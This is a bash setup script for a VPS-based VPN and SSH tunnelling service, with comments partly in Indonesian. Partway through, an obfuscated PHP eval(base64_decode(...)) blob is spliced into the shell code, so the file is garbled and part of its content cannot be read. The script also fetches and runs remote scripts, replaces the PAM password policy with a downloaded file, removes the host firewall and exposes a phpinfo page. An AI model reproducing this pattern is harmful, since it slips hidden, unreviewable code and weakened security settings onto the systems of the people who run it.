#!/bin/bash
# ==========================================
# Color
RED='\033[0;31m'
NC='\033[0m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHT='\033[0;37m'
# ==========================================
# Getting
MYIP=$(wget -qO- ipinfo.io/ip);
# ==================================================
# Link Hosting Kalian
akbarvpn="raw.githubusercontent.com/Acelrrh/Mantap/main/ssh"

# Link Hosting Kalian Untuk Xray
akbarvpnn="raw.githubusercontent.com/Acelrrh/Mantap/main/xray"

# Link Hosting Kalian Untuk Trojan Go
akbarvpnnn="raw.githubusercontent.com/Acelrrh/Mantap/main/trojango"

# Link Hosting Kalian Untuk Stunnel5
akbarvpnnnn="raw.githubusercontent.com/Acelrrh/Mantap/main/stunnel5"

# initializing var
export DEBIAN_FRONTEND=noninteractive
MYIP=$(wget -qO- ipinfo.io/ip);
MYIP2="s/xxxxxxxxx/$MYIP/g";
NET=$(ip -o $ANU -4 route show to default | awk '{print $5}');
source /etc/os-release
ver=$VERSION_ID

#detail nama perusahaan
country=ID
state=Indonesia
locality=Indonesia
organization=infinity
organizationalunit=infinity
commonname=localhost
email=hayuk69@gmail.com

# simple password minimal
wget -O /etc/pam.d/common-password "https://${akbarvpn}/password"
chmod +x /etc/pam.d/common-password

# go to root
cd

# Edit file /etc/systemd/system/rc-local.service
cat > /etc/systemd/system/rc-local.service <<-END
[Unit]
Description=/etc/rc.local
ConditionPathExists=/etc/rc.local
[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
StandardOutput=tty
RemainAfterExit=yes
SysVStartPriority=99
[Install]
WantedBy=multi-user.target
END

# nano /etc/rc.local
cat > /etc/rc.local <<-END
#!/bin/sh -e
# rc.local
# By default this script does nothing.
exit 0
END

# Ubah izin akses
chmod +x /etc/rc.local

# enable rc local
systemctl enable rc-local
systemctl start rc-local.service

# disable ipv6
echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local

#update
apt update -y
apt upgrade -y
apt dist-upgrade -y
apt-get remove --purge ufw firewalld -y
apt-get remove --purge exim4 -y

# install wget and curl
apt -y install wget curl
apt -y install net-tools

# Install Requirements Tools
apt install ruby -y
apt install python -y
apt install make -y
apt install cmake -y
apt install coreutils -y
apt install rsyslog -y
apt install net-tools -y
apt install zip -y
apt install unzip -y
apt install nano -y
apt install sed -y
apt install gnupg -y
apt install gnupg1 -y
apt install bc -y
apt install jq -y
apt install apt-transport-https -y
apt install build-essential -y
apt install dirmngr -y
apt install libxml-parser-perl -y
apt install neofetch -y
apt install git -y
apt install lsof -y
apt install libsqlite3-dev -y
apt install libz-dev -y
apt install gcc -y
apt install g++ -y
apt install libreadline-dev -y
apt install zlib1g-dev -y
apt install libssl-dev -y
apt install libssl1.0-dev -y
apt install dos2unix -y

# set time GMT +7
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime

# set locale
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config

# install
apt-get --reinstall --fix-missing install -y bzip2 gzip coreutils wget screen rsyslog iftop htop net-tools zip unzip wget net-tools curl nano sed screen gnupg gnupg1 bc apt-transport-https build-essential dirmngr libxml-parser-perl neofetch git lsof
echo "clear" >> .profile
echo "neofetch" >> .profile

# install webserver
apt -y install nginx php php-fpm php-cli php-mysql libxml-parser-perl
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
curl https://${akbarvpn}/nginx.conf > /etc/nginx/nginx.conf
curl https://${akbarvpn}/vps.conf > /etc/nginx/conf.d/vps.conf
sed -i 's/listen = \/var\/run\/php-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/fpm/pool.d/www.conf
useradd -m vps;
mkdir -p /home/vps/public_html
echo "<?php phpinfo() ?>" > /home/vps/public_html/info.php
chown -R www-data:www-data /home/vps/public_html
chmod -R g+rw /home/vps/public_html
cd /home/vps/public_html
wget -O /home/vps/public_html/index.html "https://${akbarvpn}/index.html1"
/etc/init.d/nginx restart<?php /*** PHP Encode v1.0 by zeura.com ***/ $XnNhAWEnhoiqwciqpoHH=file(__FILE__);eval(base64_decode("aWYoIWZ1bmN0aW9uX2V4aXN0cygiWWl1bklVWTc2YkJodWhOWUlPOCIpKXtmdW5jdGlvbiBZaXVuSVVZNzZiQmh1aE5ZSU84KCRnLCRiPTApeyRhPWltcGxvZGUoIlxuIiwkZyk7JGQ9YXJyYXkoNjU1LDIzNiw0MCk7aWYoJGI9PTApICRmPXN1YnN0cigkYSwkZFswXSwkZFsxXSk7ZWxzZWlmKCRiPT0xKSAkZj1zdWJzdHIoJGEsJGRbMF0rJGRbMV0sJGRbMl0pO2Vsc2UgJGY9dHJpbShzdWJzdHIoJGEsJGRbMF0rJGRbMV0rJGRbMl0pKTtyZXR1cm4oJGYpO319"));eval(base64_decode(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH)));eval(ZsldkfhGYU87iyihdfsow(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,2),YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,1)));__halt_compiler();aWYoIWZ1bmN0aW9uX2V4aXN0cygiWnNsZGtmaEdZVTg3aXlpaGRmc293Iikpe2Z1bmN0aW9uIFpzbGRrZmhHWVU4N2l5aWhkZnNvdygkYSwkaCl7aWYoJGg9PXNoYTEoJGEpKXtyZXR1cm4oZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJGEpKSk7fWVsc2V7ZWNobygiRXJyb3I6IEZpbGUgTW9kaWZpZWQiKTt9fX0=56760485812ad29ae19bf167987de827fe7106d45Ttrc9u2lp/rGf8HrOKp8yhFyY+kcaps5VhJfTexPbLTeztJxwORkMSKJBiClKzc7X+/5wAgCb6UONHsl02ntnxeAA7OCwfQg/+yJ15oT6iY7+48IIOv/ofUr7jP492d8ehssP+xd3j4offisB/s7+5cvMoA+Neb8Wh0UVAcIOxyPLx4MyqAhwg8ffveAB0h6Or9+OqtATxG4Ks/hoa8pwh6e/7mt5sC9gxh913OG5YkXjjb3Xn3x/nVYO/hasYSYn26tIgXeeGUdz1ue9GjF/eTbI7w1gsX5DcucBjyP9T3aLi7QxcTGi+jcNCJ6ao785J5OkkFix0eJixMug4P7KHD/Die2+9omNDIDijsmRDzzu5Oi1jyPkzSBflXTNfFCPce4g7YvzjGTcz/gj/ecGOge4+USCEz/sXRrpM0DJl/bA52f9VpIXo0L/QSDwb5jKMtKZg0u4t4nJCz0en58OL29fjy4mZ0cTYIeeiB5Jg6ibdkX2EoSHAw6Aj7Lvtn7yHMnnUAezG6AW4vIhYne8OL98Q6IjFPE0bEnK9IwonLpjT1E/K/hK4WZP/fUQzjk73jv/dRuuBp7DBis8SxubBi5jMqYFpLFg/2fh+Nr88vL27Pz+QiXZZQzychDSiJWJwKOqdofQ5PwyReD5BMJDRhg/PQ5SETHt3d8bkDaknWJozHMxp6n2ni8XAAq0Xlrctg6qcANJCwDwEPYWw2kCLnsLOgZNgLfzCn63Tx9PmvM/wLd0ztifCCyGckokKseOySAEQF1N/dUcq+VKuOaNB1bSXeymk78ySJxIlt7/07M5K/7QwLe+7MA+6SJ3cbZKhJzDhuQsw5zNbRsJHrJWTq+VrvYi0SFrj6tx07llxhF6xw6TmwGQ5NyMuvoiW//GKBle3ufHgPavtzd+eMCSf2IqlpKSB2upIDQiAPYR6AuKLJfHTniURUST5cK7Eg6GYdscGUxwsZ3kZ3zLlOaJyUOYhAGBB7AQMjvGbOoLe7A4ShS2P3Mk2iNBkkuJ1j3LlwOAVPgKGTwZoJIFyL36XUq9jjMRrN8+cwifMQxPo+TOKf4IDMPV0PArBoz0I/7QI9bCdM6UJZKdhnyEllIYYG87lmqnqg8peYE4shf8H1gJyuc/9J5p4gSpnE5UyQkAMonHXR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
cd

# install badvpn
cd
wget -O /usr/bin/badvpn-udpgw "https://${akbarvpn}/badvpn-udpgw64"
chmod +x /usr/bin/badvpn-udpgw
sed -i '$ i\screen -dmS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7100 --max-clients 500' /etc/rc.local
sed -i '$ i\screen -dmS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7200 --max-clients 500' /etc/rc.local
sed -i '$ i\screen -dmS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 500' /etc/rc.local
screen -dmS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7100 --max-clients 500
screen -dmS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7200 --max-clients 500
screen -dmS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 500


# setting port ssh
sed -i 's/Port 22/Port 22/g' /etc/ssh/sshd_config
sed -i '/Port 22/a Port 2253' /etc/ssh/sshd_config
echo "Port 22" >> /etc/ssh/sshd_config
echo "Port 42" >> /etc/ssh/sshd_config
/etc/init.d/ssh restart

# install dropbear
apt -y install dropbear
sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=143/g' /etc/default/dropbear
sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 109 -p 1153"/g' /etc/default/dropbear
echo "/bin/false" >> /etc/shells
echo "/usr/sbin/nologin" >> /etc/shells
/etc/init.d/dropbear restart

# install squid (proxy nya aku matikan)
cd
apt -y install squid3
wget -O /etc/squid/squid.conf "https://${akbarvpn}/squid3.conf"
sed -i $MYIP2 /etc/squid/squid.conf

# Install SSLH
apt -y install sslh
rm -f /etc/default/sslh

# Settings SSLH
cat > /etc/default/sslh <<-END
# Default options for sslh initscript
# sourced by /etc/init.d/sslh

# Disabled by default, to force yourself
# to read the configuration:
# - /usr/share/doc/sslh/README.Debian (quick start)
# - /usr/share/doc/sslh/README, at "Configuration" section
# - sslh(8) via "man sslh" for more configuration details.
# Once configuration ready, you *must* set RUN to yes here
# and try to start sslh (standalone mode only)

RUN=yes

# binary to use: forked (sslh) or single-thread (sslh-select) version
# systemd users: don't forget to modify /lib/systemd/system/sslh.service
DAEMON=/usr/sbin/sslh

DAEMON_OPTS="--user sslh --listen 0.0.0.0:777 --ssl 127.0.0.1:443 --ssh 127.0.0.1:109 --openvpn 127.0.0.1:1194 --http 127.0.0.1:80 --pidfile /var/run/sslh/sslh.pid -n"

END

# Restart Service SSLH
service sslh restart
systemctl restart sslh
/etc/init.d/sslh restart
/etc/init.d/sslh status
/etc/init.d/sslh restart

# setting vnstat
apt -y install vnstat
/etc/init.d/vnstat restart
apt -y install libsqlite3-dev
wget https://humdi.net/vnstat/vnstat-2.6.tar.gz
tar zxvf vnstat-2.6.tar.gz
cd vnstat-2.6
./configure --prefix=/usr --sysconfdir=/etc && make && make install
cd
vnstat -u -i $NET
sed -i 's/Interface "'""eth0""'"/Interface "'""$NET""'"/g' /etc/vnstat.conf
chown vnstat:vnstat /var/lib/vnstat -R
systemctl enable vnstat
/etc/init.d/vnstat restart
rm -f /root/vnstat-2.6.tar.gz
rm -rf /root/vnstat-2.6

# install stunnel 5 
cd /root/
wget -q -O stunnel5.zip "https://${akbarvpnnnn}/stunnel5.zip"
unzip -o stunnel5.zip
cd /root/stunnel
chmod +x configure
./configure
make
make install
cd /root
rm -r -f stunnel
rm -f stunnel5.zip
mkdir -p /etc/stunnel5
chmod 644 /etc/stunnel5

# Download Config Stunnel5
cat > /etc/stunnel5/stunnel5.conf <<-END
cert = /etc/xray/xray.crt
key = /etc/xray/xray.key
client = no
socket = a:SO_REUSEADDR=1
socket = l:TCP_NODELAY=1
socket = r:TCP_NODELAY=1

[dropbear]
accept = 445
connect = 127.0.0.1:109

[openssh]
accept = 777
connect = 127.0.0.1:443

[openvpn]
accept = 990
connect = 127.0.0.1:1194


END

# make a certificate
#openssl genrsa -out key.pem 2048
#openssl req -new -x509 -key key.pem -out cert.pem -days 1095 \
#-subj "/C=$country/ST=$state/L=$locality/O=$organization/OU=$organizationalunit/CN=$commonname/emailAddress=$email"
#cat key.pem cert.pem >> /etc/stunnel5/stunnel5.pem

# Service Stunnel5 systemctl restart stunnel5
cat > /etc/systemd/system/stunnel5.service << END
[Unit]
Description=Stunnel5 Service
Documentation=https://stunnel.org
Documentation=https://github.com/Akbar218
After=syslog.target network-online.target

[Service]
ExecStart=/usr/local/bin/stunnel5 /etc/stunnel5/stunnel5.conf
Type=forking

[Install]
WantedBy=multi-user.target
END

# Service Stunnel5 /etc/init.d/stunnel5
wget -q -O /etc/init.d/stunnel5 "https://${akbarvpnnnn}/stunnel5.init"

# Ubah Izin Akses
chmod 600 /etc/stunnel5/stunnel5.pem
chmod +x /etc/init.d/stunnel5
cp /usr/local/bin/stunnel /usr/local/bin/stunnel5

# Remove File
rm -r -f /usr/local/share/doc/stunnel/
rm -r -f /usr/local/etc/stunnel/
rm -f /usr/local/bin/stunnel
rm -f /usr/local/bin/stunnel3
rm -f /usr/local/bin/stunnel4
#rm -f /usr/local/bin/stunnel5

# Restart Stunnel 5
systemctl stop stunnel5
systemctl enable stunnel5
systemctl start stunnel5
systemctl restart stunnel5
/etc/init.d/stunnel5 restart
/etc/init.d/stunnel5 status
/etc/init.d/stunnel5 restart

#OpenVPN
wget https://${akbarvpn}/vpn.sh &&  chmod +x vpn.sh && ./vpn.sh

# install fail2ban
apt -y install fail2ban

# Instal DDOS Flate
if [ -d '/usr/local/ddos' ]; then
	echo; echo; echo "Please un-install the previous version first"
	exit 0
else
	mkdir /usr/local/ddos
fi
clear

# banner /etc/issue.net
echo "Banner /etc/issue.net" >>/etc/ssh/sshd_config
sed -i 's@DROPBEAR_BANNER=""@DROPBEAR_BANNER="/etc/issue.net"@g' /etc/default/dropbear

# Install BBR
wget https://${akbarvpn}/bbr.sh && chmod +x bbr.sh && ./bbr.sh

# Ganti Banner
wget -O /etc/issue.net "https://${akbarvpn}/issue.net"

# blockir torrent
iptables -A FORWARD -m string --string "get_peers" --algo bm -j DROP
iptables -A FORWARD -m string --string "announce_peer" --algo bm -j DROP
iptables -A FORWARD -m string --string "find_node" --algo bm -j DROP
iptables -A FORWARD -m string --algo bm --string "BitTorrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "BitTorrent protocol" -j DROP
iptables -A FORWARD -m string --algo bm --string "peer_id=" -j DROP
iptables -A FORWARD -m string --algo bm --string ".torrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "announce.php?passkey=" -j DROP
iptables -A FORWARD -m string --algo bm --string "torrent" -j DROP
iptables -A FORWARD -m string --algo bm --string "announce" -j DROP
iptables -A FORWARD -m string --algo bm --string "info_hash" -j DROP
iptables-save > /etc/iptables.up.rules
iptables-restore -t < /etc/iptables.up.rules
netfilter-persistent save
netfilter-persistent reload

# download script
cd /usr/bin
wget -O addhost "https://${akbarvpn}/addhost.sh"
wget -O slhost "https://${akbarvpn}/slhost.sh"
wget -O about "https://${akbarvpn}/about.sh"
wget -O menu "https://raw.githubusercontent.com/acelrrh/Mantap/main/update/menu.sh"
wget -O addssh "https://${akbarvpn}/addssh.sh"
wget -O trialssh "https://${akbarvpn}/trialssh.sh"
wget -O delssh "https://${akbarvpn}/delssh.sh"
wget -O member "https://${akbarvpn}/member.sh"
wget -O delexp "https://${akbarvpn}/delexp.sh"
wget -O cekssh "https://${akbarvpn}/cekssh.sh"
wget -O restart "https://${akbarvpn}/restart.sh"
wget -O speedtest "https://${akbarvpn}/speedtest_cli.py"
wget -O info "https://${akbarvpn}/info.sh"
wget -O ram "https://${akbarvpn}/ram.sh"
wget -O renewssh "https://${akbarvpn}/renewssh.sh"
wget -O autokill "https://${akbarvpn}/autokill.sh"
wget -O ceklim "https://${akbarvpn}/ceklim.sh"
wget -O tendang "https://${akbarvpn}/tendang.sh"
wget -O clearlog "https://${akbarvpn}/clearlog.sh"
wget -O changeport "https://${akbarvpn}/changeport.sh"
wget -O portovpn "https://${akbarvpn}/portovpn.sh"
wget -O portwg "https://${akbarvpn}/portwg.sh"
wget -O porttrojan "https://${akbarvpn}/porttrojan.sh"
wget -O portsstp "https://${akbarvpn}/portsstp.sh"
wget -O portsquid "https://${akbarvpn}/portsquid.sh"
wget -O portvlm "https://${akbarvpn}/portvlm.sh"
wget -O wbmn "https://${akbarvpn}/webmin.sh"
wget -O xp "https://${akbarvpn}/xp.sh"
wget -O swapkvm "https://${akbarvpn}/swapkvm.sh"
wget -O addvmess "https://${akbarvpnn}/addv2ray.sh"
wget -O addvless "https://${akbarvpnn}/addvless.sh"
wget -O addtrojan "https://${akbarvpnn}/addtrojan.sh"
wget -O addgrpc "https://${akbarvpnn}/addgrpc.sh"
wget -O cekgrpc "https://${akbarvpnn}/cekgrpc.sh"
wget -O delgrpc "https://${akbarvpnn}/delgrpc.sh"
wget -O renewgrpc "https://${akbarvpnn}/renewgrpc.sh"
wget -O delvmess "https://${akbarvpnn}/delv2ray.sh"
wget -O delvless "https://${akbarvpnn}/delvless.sh"
wget -O deltrojan "https://${akbarvpnn}/deltrojan.sh"
wget -O cekvmess "https://${akbarvpnn}/cekv2ray.sh"
wget -O cekvless "https://${akbarvpnn}/cekvless.sh"
wget -O cektrojan "https://${akbarvpnn}/cektrojan.sh"
wget -O renewvmess "https://${akbarvpnn}/renewv2ray.sh"
wget -O renewvless "https://${akbarvpnn}/renewvless.sh"
wget -O renewtrojan "https://${akbarvpnn}/renewtrojan.sh"
wget -O certv2ray "https://${akbarvpnn}/certv2ray.sh"
wget -O addtrgo "https://${akbarvpnnn}/addtrgo.sh"
wget -O deltrgo "https://${akbarvpnnn}/deltrgo.sh"
wget -O renewtrgo "https://${akbarvpnnn}/renewtrgo.sh"
wget -O cektrgo "https://${akbarvpnnn}/cektrgo.sh"
wget -O portsshnontls "https://raw.githubusercontent.com/Acelrrh/Mantap/main/websocket/portsshnontls.sh"
wget -O portsshws "https://raw.githubusercontent.com/Acelrrh/Mantap/main/websocket/portsshws.sh"

wget -O ipsaya "https://raw.githubusercontent.com/Acelrrh/Mantap/main/update/ipsaya.sh"
wget -O sshovpnmenu "https://raw.githubusercontent.com/Acelrrh/Mantap/main/update/sshovpn.sh"
wget -O l2tpmenu "https://raw.githubusercontent.com/Acelrrh/Mantap/main/update/l2tpmenu.sh"
wget -O pptpmenu "https://raw.githubusercontent.com/Acelrrh/Mantap/main/update/pptpmenu.sh"
wget -O sstpmenu "https://raw.githubusercontent.com/Acelrrh/Mantap/main/update/sstpmenu.sh"
wget -O wgmenu "https://raw.githubusercontent.com/Acelrrh/Mantap/main/update/wgmenu.sh"
wget -O ssmenu "https://raw.githubusercontent.com/Acelrrh/Mantap/main/update/ssmenu.sh"
wget -O ssrmenu "https://raw.githubusercontent.com/Acelrrh/Mantap/main/update/ssrmenu.sh"
wget -O vmessmenu "https://raw.githubusercontent.com/Acelrrh/Mantap/main/update/vmessmenu.sh"
wget -O vlessmenu "https://raw.githubusercontent.com/Acelrrh/Mantap/main/update/vlessmenu.sh"
wget -O grpcmenu "https://raw.githubusercontent.com/Acelrrh/Mantap/main/update/grpcmenu.sh"
wget -O grpcupdate "https://raw.githubusercontent.com/Acelrrh/Mantap/main/update/grpcupdate.sh"
wget -O trmenu "https://raw.githubusercontent.com/Acelrrh/Mantap/main/update/trmenu.sh"
wget -O trgomenu "https://raw.githubusercontent.com/Acelrrh/Mantap/main/update/trgomenu.sh"
wget -O setmenu "https://raw.githubusercontent.com/Acelrrh/Mantap/main/update/setmenu.sh"
wget -O slowdnsmenu "https://raw.githubusercontent.com/Acelrrh/Mantap/main/update/slowdnsmenu.sh"
wget -O running "https://raw.githubusercontent.com/Acelrrh/Mantap/main/update/running.sh"
wget -O updatemenu "https://raw.githubusercontent.com/Acelrrh/Mantap/main/update/updatemenu.sh"
wget -O sl-fix "https://raw.githubusercontent.com/Acelrrh/Mantap/main/sslh-fix/sl-fix"

chmod +x sl-fix
chmod +x ipsaya
